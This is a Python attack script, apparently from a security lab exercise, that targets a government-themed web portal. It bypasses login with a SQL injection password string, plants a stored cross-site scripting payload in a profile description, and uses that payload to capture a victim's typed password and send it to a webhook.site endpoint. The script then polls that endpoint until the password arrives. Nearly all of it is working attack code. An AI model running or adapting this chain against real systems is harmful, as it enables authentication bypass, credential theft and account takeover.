# The Python script for Attack 3

import json
import time
import requests
from bs4 import BeautifulSoup

# Doing attack 2 to get the session key
print("Executing attack 2 to get the login cookie...")
cookies = requests.post('https://inner.portal.regjeringen.uiaikt.no/login', data={'username': 'jonas.dahl','password': "' OR 1 = 1 OR '"}, allow_redirects=False).cookies


# Define the URL
url = 'https://inner.portal.regjeringen.uiaikt.no/edit_profile'
webhook_id = "0aed6027-4656-46f2-b145-44a9e8f3e6b5"
webhook_url = f"webhook.site/{webhook_id}"
webhook_api = f"https://webhook.site/token/{webhook_id}/requests?page=1&password=&query=&sorting=newest"
incognito_user_agent = "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
identifier = "eiunrg9ea8gnq780b4387"
payload = """
<script>
//""" + identifier + """

document.addEventListener("DOMContentLoaded", () => {
    document.getElementById("authForm").addEventListener("submit", () => {
        const key = document.getElementById("authPassword").value;
        fetch("//""" + webhook_url + """?key=" + encodeURIComponent(key));
    })
});

</script>
"""

while True:
    # Grab the existing description for extra incognito style
    response = requests.get(url, cookies=cookies, allow_redirects=False)
    if response.status_code != 200:
        print(f"Failed to get description. Website returned response code: {response.status_code}")
        exit(1)

    # Parse the HTML response
    soup = BeautifulSoup(response.text, 'html.parser')

    # Find the textarea element with id 'description'
    textarea = soup.find('textarea', {'id': 'description'})

    if not textarea:
        print("Failed to get description. No element textarea found")
        exit(1)

    # Check if payload is there already or not
    if identifier not in textarea.text:
        text = textarea.text + payload

        # Define the form data
        data = {
            'description': text
        }

        # Send the POST request
        response = requests.post(url, data=data, cookies=cookies, allow_redirects=False)

        # Check the status code
        if response.is_redirect and response.headers["Location"] == "/":
            print("Changed description to: ")
            print(text)
        else:
            print(f'Unexpected redirect: {response.headers["Location"]}')
            exit(1)


    print("Waiting for victim to login...")
    time.sleep(30)
    print("Checking if webhook has been received...")

    response = requests.get(webhook_api, headers={'User-Agent': incognito_user_agent}, allow_redirects=False)
    if response.status_code != 200:
        print(f"Failed to get webhook info, status {response.status_code}. Script can't continue, check manually instead: {webhook_api}")
        exit(1)

    try:
        # Try to parse the response as JSON
        data = response.json()

        # Get the value of the key
        if "data" in data and len(data["data"]) > 0 and "query" in data["data"][0] and "key" in data["data"][0]["query"]:
            password = data["data"][0]["query"]["key"]
            print('Found password:', password)
            exit(0)
    except json.JSONDecodeError:
        print('The response is not a JSON')
        print("Can't continue, check manually instead: " + webhook_api)
        exit(1)

    print("Checking if description is still there")
